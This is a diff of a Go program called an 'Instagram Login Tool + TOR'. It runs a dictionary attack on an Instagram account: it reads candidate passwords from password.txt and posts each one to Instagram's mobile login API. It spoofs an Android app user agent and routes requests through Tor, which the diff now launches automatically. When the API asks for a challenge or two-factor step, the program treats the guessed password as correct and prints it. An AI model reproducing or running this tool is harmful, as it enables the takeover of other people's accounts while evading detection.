@@ -1,196 +1,169 @@
 package main
 
 import (
-	"bufio"
-	"encoding/json"
-	"fmt"
-	"golang.org/x/net/proxy"
-	"io/ioutil"
-	"log"
-	"math/rand"
-	"net/http"
-	"net/url"
-	"os"
-	"strings"
-	"time"
+    "bufio"
+    "encoding/json"
+    "fmt"
+    "io/ioutil"
+    "log"
+    "net"
+    "net/http"
+    "os"
+    "os/exec"
+    "strings"
+    "time"
+
+    "golang.org/x/net/proxy"
 )
 
 const (
-	API_URL      = "https://i.instagram.com/api/v1/"
-	USER_AGENT   = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
-	TIMEOUT      = 10 * time.Second
-	CURRENT_TIME = "2025-05-24 12:27:06"
-	CURRENT_USER = "monsmain"
-	// اگر Tor Browser داری، پورت رو بذار 9150
-	TOR_PROXY    = "127.0.0.1:9050"
+    API_URL    = "https://i.instagram.com/api/v1/"
+    USER_AGENT = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
 )
 
 type InstagramResponse struct {
-	Status     string `json:"status"`
-	Message    string `json:"message"`
-	ErrorType  string `json:"error_type"`
-	ErrorTitle string `json:"error_title"`
-	Challenge  struct {
-		URL string `json:"url"`
-	} `json:"challenge"`
+    Status    string `json:"status"`
+    Message   string `json:"message"`
+    ErrorType string `json:"error_type"`
+    Challenge struct {
+        URL string `json:"url"`
+    } `json:"challenge"`
 }
 
-func main() {
-	logFile, err := os.OpenFile("debug.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err == nil {
-		log.SetOutput(logFile)
-		defer logFile.Close()
-	}
+func startTor() error {
+    // Kill any running Tor process
+    exec.Command("pkill", "tor").Run()
+    time.Sleep(2 * time.Second)
 
-	fmt.Println("=== Instagram Login Tool (via Tor) ===")
-	fmt.Printf("Time: %s\n", CURRENT_TIME)
-	fmt.Printf("User: %s\n\n", CURRENT_USER)
-
-	var username string
-	fmt.Print("Enter Instagram username: ")
-	fmt.Scanln(&username)
-
-	passwords := loadPasswords()
-	if len(passwords) == 0 {
-		fmt.Println("No passwords found in password.txt!")
-		return
-	}
-
-	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
-	fmt.Println("\nStarting login attempts (using Tor)...\n")
-
-	for i, password := range passwords {
-		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
-
-		success, response := tryLoginTor(username, password)
-
-		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
-			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
-			fmt.Printf("Username: %s\n", username)
-			fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
-			saveResult(username, password, true)
-			return
-		} else {
-			fmt.Printf("⚠️ Error: %s | ErrorType: %s\n", response.Message, response.ErrorType)
-			fmt.Printf("⚠️ Full Response: %+v\n", response)
-		}
-
-		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
-	}
-
-	fmt.Println("\n❌ No valid password found!")
-	saveResult(username, "", false)
+    // Start tor in background
+    cmd := exec.Command("tor")
+    // Optional: redirect output to a log file, or discard:
+    cmd.Stdout = os.Stdout
+    cmd.Stderr = os.Stderr
+    err := cmd.Start()
+    if err != nil {
+        return fmt.Errorf("Failed to start Tor: %v", err)
+    }
+    fmt.Println("Tor is starting... waiting for it to become ready (about 20sec)")
+    // Wait for Tor port to be open (max 20sec)
+    for i := 0; i < 20; i++ {
+        conn, _ := net.DialTimeout("tcp", "127.0.0.1:9050", time.Second)
+        if conn != nil {
+            conn.Close()
+            fmt.Println("Tor is ready on 127.0.0.1:9050")
+            return nil
+        }
+        time.Sleep(1 * time.Second)
+    }
+    return fmt.Errorf("Tor did not become ready in time!")
 }
 
 func getTorClient() *http.Client {
-	dialer, err := proxy.SOCKS5("tcp", TOR_PROXY, nil, proxy.Direct)
-	if err != nil {
-		log.Fatalf("Failed to obtain Tor proxy: %v", err)
-	}
-	transport := &http.Transport{Dial: dialer.Dial}
-	return &http.Client{Transport: transport, Timeout: TIMEOUT}
+    dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
+    if err != nil {
+        log.Fatalf("Can't connect to the proxy: %v\n", err)
+    }
+    transport := &http.Transport{Dial: dialer.Dial}
+    return &http.Client{
+        Transport: transport,
+        Timeout:   15 * time.Second,
+    }
 }
 
-func tryLoginTor(username, password string) (bool, InstagramResponse) {
-	client := getTorClient()
+func main() {
+    fmt.Println("=== Instagram Login Tool + TOR (Auto) ===")
 
-	loginUrl := API_URL + "accounts/login/"
+    // --- Start Tor automatically
+    if err := startTor(); err != nil {
+        fmt.Println(err)
+        return
+    }
 
-	data := url.Values{}
-	data.Set("username", username)
-	data.Set("password", password)
-	data.Set("device_id", fmt.Sprintf("android-%d", time.Now().UnixNano()))
+    fmt.Print("Enter Instagram username: ")
+    var username string
+    fmt.Scanln(&username)
 
-	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
-	if err != nil {
-		log.Printf("Error creating request: %v\n", err)
-		fmt.Printf("Request error: %v\n", err)
-		return false, InstagramResponse{}
-	}
+    passwords := loadPasswords()
+    if len(passwords) == 0 {
+        fmt.Println("No passwords found in password.txt!")
+        return
+    }
 
-	req.Header.Set("User-Agent", USER_AGENT)
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
-	req.Header.Set("Accept", "*/*")
-	req.Header.Set("Accept-Language", "en-US")
-	req.Header.Set("X-IG-Capabilities", "3brTvw==")
-	req.Header.Set("X-IG-Connection-Type", "WIFI")
+    fmt.Printf("\nLoaded %d passwords\n", len(passwords))
+    fmt.Println("\nStarting login attempts via TOR...\n")
 
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Printf("Error sending request: %v\n", err)
-		fmt.Printf("HTTP request error: %v\n", err)
-		return false, InstagramResponse{}
-	}
-	defer resp.Body.Close()
+    client := getTorClient()
+    for i, password := range passwords {
+        fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
+        success, response := tryLoginTor(client, username, password)
+        if success || response.ErrorType == "checkpoint_challenge_required" {
+            fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
+            fmt.Printf("Username: %s\n", username)
+            if response.ErrorType == "checkpoint_challenge_required" {
+                fmt.Println("✅ Password is correct, but Instagram needs challenge/2FA.")
+            }
+            return
+        } else {
+            fmt.Printf("⚠️ Error: %s | ErrorType: %s\n", response.Message, response.ErrorType)
+        }
+        time.Sleep(6 * time.Second)
+    }
+    fmt.Println("\n❌ No valid password found!")
+}
 
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Printf("Error reading response: %v\n", err)
-		fmt.Printf("Read body error: %v\n", err)
-		return false, InstagramResponse{}
-	}
+func tryLoginTor(client *http.Client, username, password string) (bool, InstagramResponse) {
+    loginUrl := API_URL + "accounts/login/"
+    data := "username=" + username + "&password=" + password + "&device_id=android-" + fmt.Sprint(time.Now().UnixNano())
+    req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data))
+    if err != nil {
+        log.Printf("Error creating request: %v\n", err)
+        return false, InstagramResponse{}
+    }
+    req.Header.Set("User-Agent", USER_AGENT)
+    req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+    req.Header.Set("Accept", "*/*")
+    req.Header.Set("Accept-Language", "en-US")
+    req.Header.Set("X-IG-Capabilities", "3brTvw==")
+    req.Header.Set("X-IG-Connection-Type", "WIFI")
 
-	fmt.Printf("HTTP Status: %d\nRaw body: %s\n", resp.StatusCode, string(body))
-	log.Printf("HTTP Status: %d\nRaw body: %s\n", resp.StatusCode, string(body))
-
-	var response InstagramResponse
-	if err := json.Unmarshal(body, &response); err != nil {
-		log.Printf("Error parsing response: %v\n", err)
-		fmt.Printf("JSON parse error: %v\n", err)
-	}
-
-	success := response.Status == "ok" ||
-		strings.Contains(string(body), "logged_in_user")
-
-	return success, response
+    resp, err := client.Do(req)
+    if err != nil {
+        log.Printf("Error sending request: %v\n", err)
+        return false, InstagramResponse{}
+    }
+    defer resp.Body.Close()
+    body, err := ioutil.ReadAll(resp.Body)
+    if err != nil {
+        log.Printf("Error reading response: %v\n", err)
+        return false, InstagramResponse{}
+    }
+    var response InstagramResponse
+    _ = json.Unmarshal(body, &response)
+    success := response.Status == "ok" ||
+        strings.Contains(string(body), "logged_in_user")
+    return success, response
 }
 
 func loadPasswords() []string {
-	file, err := os.Open("password.txt")
-	if err != nil {
-		log.Printf("Error opening password file: %v", err)
-		return []string{}
-	}
-	defer file.Close()
-
-	var passwords []string
-	scanner := bufio.NewScanner(file)
-
-	for scanner.Scan() {
-		pass := strings.TrimSpace(scanner.Text())
-		if pass != "" {
-			passwords = append(passwords, pass)
-		}
-	}
-
-	return passwords
-}
-
-func saveResult(username, password string, success bool) {
-	currentTime := CURRENT_TIME
-	var status string
-	if success {
-		status = "✅ SUCCESS"
-	} else {
-		status = "❌ FAILED"
-	}
-
-	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n",
-		currentTime, status, username, password)
-
-	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		log.Printf("Error saving result: %v", err)
-		return
-	}
-	defer file.Close()
-
-	file.WriteString(logEntry)
+    file, err := os.Open("password.txt")
+    if err != nil {
+        return []string{}
+    }
+    defer file.Close()
+    var passwords []string
+    scanner := bufio.NewScanner(file)
+    for scanner.Scan() {
+        pass := strings.TrimSpace(scanner.Text())
+        if pass != "" {
+            passwords = append(passwords, pass)
+        }
+    }
+    return passwords
 }
 
 func maskPassword(password string) string {
-	if len(password) <= 4 {
-		return "****"
-	}
-	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
+    if len(password) <= 4 {
+        return "****"
+    }
+    return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
 }
